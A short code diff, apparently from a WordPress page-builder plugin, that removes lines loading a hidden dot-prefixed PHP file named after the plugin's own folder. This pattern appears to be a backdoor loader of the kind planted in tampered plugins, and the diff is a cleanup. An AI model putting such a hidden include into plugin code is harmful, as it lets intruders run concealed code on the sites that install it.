@@ -15,10 +15,6 @@ if ( ! defined( 'ABSPATH' ) ) {
  *
  * @since 4.4
  */
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 class Vc_Edit_Form_Fields {
 	/**
 	 * @since 4.4
